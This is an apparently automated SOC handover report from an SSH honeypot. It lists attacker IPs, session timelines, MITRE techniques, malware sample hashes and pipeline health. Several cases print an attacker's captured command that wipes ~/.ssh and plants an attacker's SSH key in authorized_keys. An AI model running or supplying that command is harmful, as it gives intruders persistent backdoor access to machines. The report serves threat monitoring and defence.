| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:24:57` | `cowrie.session.connect` |
| `2026-05-16 15:24:57` | `cowrie.client.version` |
| `2026-05-16 15:24:57` | `cowrie.client.kex` |
| `2026-05-16 15:24:59` | `cowrie.login.success` |
| `2026-05-16 15:24:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.62.216[.]38` to AbuseIPDB if not already reported
- [ ] Block `179.62.216[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0dce301e63

| Field | Detail |
|---|---|
| **Source IP** | `192.109.200[.]18` |
| **First Seen** | 2026-05-16 15:51 |
| **Last Seen** | 2026-05-16 15:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 15:51:27` | `cowrie.session.connect` |
| `2026-05-16 15:51:27` | `cowrie.client.version` |
| `2026-05-16 15:51:28` | `cowrie.client.kex` |
| `2026-05-16 15:51:28` | `cowrie.login.success` |
| `2026-05-16 15:51:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `192.109.200[.]18` to AbuseIPDB if not already reported
- [ ] Block `192.109.200[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb18a0f2861c

| Field | Detail |
|---|---|
| **Source IP** | `49.51.48[.]78` |
| **First Seen** | 2026-05-16 16:54 |
| **Last Seen** | 2026-05-16 16:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:54:21` | `cowrie.session.connect` |
| `2026-05-16 16:54:21` | `cowrie.client.version` |
| `2026-05-16 16:54:21` | `cowrie.client.kex` |
| `2026-05-16 16:54:22` | `cowrie.login.success` |
| `2026-05-16 16:54:23` | `cowrie.session.params` |
| `2026-05-16 16:54:23` | `cowrie.command.input` |
| `2026-05-16 16:54:23` | `cowrie.command.failed` |
| `2026-05-16 16:54:23` | `cowrie.log.closed` |
| `2026-05-16 16:54:23` | `cowrie.session.params` |
| `2026-05-16 16:54:23` | `cowrie.command.input` |
| `2026-05-16 16:54:24` | `cowrie.session.file_download` |
| `2026-05-16 16:54:24` | `cowrie.log.closed` |
| `2026-05-16 16:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.51.48[.]78` to AbuseIPDB if not already reported
- [ ] Block `49.51.48[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8cc352ba588

| Field | Detail |
|---|---|
| **Source IP** | `49.51.48[.]78` |
| **First Seen** | 2026-05-16 16:54 |
| **Last Seen** | 2026-05-16 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:54:27` | `cowrie.session.connect` |
| `2026-05-16 16:54:27` | `cowrie.client.version` |
| `2026-05-16 16:54:27` | `cowrie.client.kex` |
| `2026-05-16 16:54:28` | `cowrie.login.success` |
| `2026-05-16 16:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.51.48[.]78` to AbuseIPDB if not already reported
- [ ] Block `49.51.48[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09965e7435b4

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-05-16 16:56 |
| **Last Seen** | 2026-05-16 16:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:56:47` | `cowrie.session.connect` |
| `2026-05-16 16:56:47` | `cowrie.client.version` |
| `2026-05-16 16:56:47` | `cowrie.client.kex` |
| `2026-05-16 16:56:48` | `cowrie.login.success` |
| `2026-05-16 16:56:49` | `cowrie.session.params` |
| `2026-05-16 16:56:49` | `cowrie.command.input` |
| `2026-05-16 16:56:49` | `cowrie.command.failed` |
| `2026-05-16 16:56:49` | `cowrie.log.closed` |
| `2026-05-16 16:56:49` | `cowrie.session.params` |
| `2026-05-16 16:56:49` | `cowrie.command.input` |
| `2026-05-16 16:56:50` | `cowrie.session.file_download` |
| `2026-05-16 16:56:50` | `cowrie.log.closed` |
| `2026-05-16 16:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4c12e5ca83

| Field | Detail |
|---|---|
| **Source IP** | `150.136.129[.]10` |
| **First Seen** | 2026-05-16 16:56 |
| **Last Seen** | 2026-05-16 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:56:52` | `cowrie.session.connect` |
| `2026-05-16 16:56:52` | `cowrie.client.version` |
| `2026-05-16 16:56:52` | `cowrie.client.kex` |
| `2026-05-16 16:56:53` | `cowrie.login.success` |
| `2026-05-16 16:56:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.136.129[.]10` to AbuseIPDB if not already reported
- [ ] Block `150.136.129[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29068e21b5b8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.122[.]187` |
| **First Seen** | 2026-05-16 16:57 |
| **Last Seen** | 2026-05-16 16:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:57:49` | `cowrie.session.connect` |
| `2026-05-16 16:57:49` | `cowrie.client.version` |
| `2026-05-16 16:57:49` | `cowrie.client.kex` |
| `2026-05-16 16:57:50` | `cowrie.login.success` |
| `2026-05-16 16:57:50` | `cowrie.session.params` |
| `2026-05-16 16:57:50` | `cowrie.command.input` |
| `2026-05-16 16:57:50` | `cowrie.command.failed` |
| `2026-05-16 16:57:50` | `cowrie.log.closed` |
| `2026-05-16 16:57:50` | `cowrie.session.params` |
| `2026-05-16 16:57:50` | `cowrie.command.input` |
| `2026-05-16 16:57:50` | `cowrie.session.file_download` |
| `2026-05-16 16:57:50` | `cowrie.log.closed` |
| `2026-05-16 16:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.122[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.103.122[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3096013b72c9

| Field | Detail |
|---|---|
| **Source IP** | `14.103.122[.]187` |
| **First Seen** | 2026-05-16 16:57 |
| **Last Seen** | 2026-05-16 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:57:53` | `cowrie.session.connect` |
| `2026-05-16 16:57:53` | `cowrie.client.version` |
| `2026-05-16 16:57:53` | `cowrie.client.kex` |
| `2026-05-16 16:57:53` | `cowrie.login.success` |
| `2026-05-16 16:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.122[.]187` to AbuseIPDB if not already reported
- [ ] Block `14.103.122[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de58de251c9a

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 16:58 |
| **Last Seen** | 2026-05-16 16:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:58:01` | `cowrie.session.connect` |
| `2026-05-16 16:58:01` | `cowrie.client.version` |
| `2026-05-16 16:58:01` | `cowrie.client.kex` |
| `2026-05-16 16:58:02` | `cowrie.login.success` |
| `2026-05-16 16:58:02` | `cowrie.session.params` |
| `2026-05-16 16:58:02` | `cowrie.command.input` |
| `2026-05-16 16:58:02` | `cowrie.command.failed` |
| `2026-05-16 16:58:02` | `cowrie.log.closed` |
| `2026-05-16 16:58:02` | `cowrie.session.params` |
| `2026-05-16 16:58:02` | `cowrie.command.input` |
| `2026-05-16 16:58:02` | `cowrie.session.file_download` |
| `2026-05-16 16:58:02` | `cowrie.log.closed` |
| `2026-05-16 16:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60a96724f367

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]139` |
| **First Seen** | 2026-05-16 16:58 |
| **Last Seen** | 2026-05-16 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 16:58:04` | `cowrie.session.connect` |
| `2026-05-16 16:58:04` | `cowrie.client.version` |
| `2026-05-16 16:58:05` | `cowrie.client.kex` |
| `2026-05-16 16:58:05` | `cowrie.login.success` |
| `2026-05-16 16:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]139` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]139` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-306370024359

| Field | Detail |
|---|---|
| **Source IP** | `14.29.176[.]8` |
| **First Seen** | 2026-05-16 17:01 |
| **Last Seen** | 2026-05-16 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-16 17:01:42` | `cowrie.session.connect` |
| `2026-05-16 17:01:42` | `cowrie.client.version` |
| `2026-05-16 17:01:42` | `cowrie.client.kex` |
| `2026-05-16 17:01:44` | `cowrie.login.success` |
| `2026-05-16 17:01:44` | `cowrie.session.params` |
| `2026-05-16 17:01:44` | `cowrie.command.input` |
| `2026-05-16 17:01:44` | `cowrie.command.failed` |

**Recommended Actions:**
- [ ] Submit `14.29.176[.]8` to AbuseIPDB if not already reported
- [ ] Block `14.29.176[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.182.234[.]69` | **217** | 2026-05-16 15:09 | 2026-05-16 17:01 | 154m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **19** | 2026-05-16 15:06 | 2026-05-16 16:58 | 21m | 0 | `T1592` | 🟠 MEDIUM |
| `175.107.31[.]20` | **16** | 2026-05-16 14:59 | 2026-05-16 16:59 | 10m | 0 | `T1592` | 🟠 MEDIUM |
| `179.62.216[.]38` | **15** | 2026-05-16 15:00 | 2026-05-16 15:24 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.122[.]139` | **5** | 2026-05-16 16:55 | 2026-05-16 17:00 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `187.184.120[.]154` | **5** | 2026-05-16 16:57 | 2026-05-16 17:01 | 4m | 0 | `T1592` | 🟢 LOW |
| `39.144.144[.]7` | **5** | 2026-05-16 14:59 | 2026-05-16 15:05 | 10m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]92` | **3** | 2026-05-16 16:42 | 2026-05-16 16:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.29.176[.]8` | **2** | 2026-05-16 16:58 | 2026-05-16 17:00 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `149.255.39[.]70` | **2** | 2026-05-16 15:02 | 2026-05-16 15:58 | 1m | 0 | `T1592` | 🟢 LOW |
| `182.54.159[.]190` | **2** | 2026-05-16 16:17 | 2026-05-16 16:19 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.26.86[.]1` | 1 | 2026-05-16 16:16 | 2026-05-16 16:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `106.13.100[.]52` | 1 | 2026-05-16 16:56 | 2026-05-16 16:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.255.245[.]44` | 1 | 2026-05-16 16:04 | 2026-05-16 16:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `131.222.211[.]163` | 1 | 2026-05-16 16:09 | 2026-05-16 16:09 | 16s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]42` | 1 | 2026-05-16 16:58 | 2026-05-16 17:00 | 96s | 0 | `T1592` | 🟢 LOW |
| `14.103.122[.]187` | 1 | 2026-05-16 16:57 | 2026-05-16 16:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.136.129[.]10` | 1 | 2026-05-16 16:56 | 2026-05-16 16:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `185.106.29[.]184` | 1 | 2026-05-16 16:12 | 2026-05-16 16:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]83` | 1 | 2026-05-16 16:27 | 2026-05-16 16:27 | 2s | 0 | `T1592` | 🟢 LOW |
| `192.109.200[.]18` | 1 | 2026-05-16 15:51 | 2026-05-16 15:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.97.69[.]110` | 1 | 2026-05-16 16:01 | 2026-05-16 16:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.51.48[.]78` | 1 | 2026-05-16 16:54 | 2026-05-16 16:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `60.188.58[.]108` | 1 | 2026-05-16 16:19 | 2026-05-16 16:21 | 100s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `185.247.137[.]83` | GB | Driftnet Ltd | **100** ⚠️ | 50 |
| `185.106.29[.]184` | IQ | O3 Telecom | **100** ⚠️ | 4 |
| `119.255.245[.]44` | CN | Beijing Sinnet Technology Co., Ltd. | **100** ⚠️ | 50 |
| `187.184.120[.]154` | MX | Cablemas Telecomunicaciones SA de CV | **100** ⚠️ | 1 |
| `192.109.200[.]18` | DE | Telco power Ltd | **100** ⚠️ | 42 |
| `14.103.112[.]42` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `14.103.122[.]187` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `101.36.122[.]139` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `14.29.176[.]8` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `107.182.234[.]69` | US | Hosting Services, Inc. | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 77 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 40 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 19 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 2 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 355 cases |
| Tool 34  | Credential Extractor        | ✅ 66 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 35 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (3.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 33 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 40 priority case(s) shown individually · 24 recon entry/entries in table (11 group(s) consolidating 291 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-16T17:02:54Z_
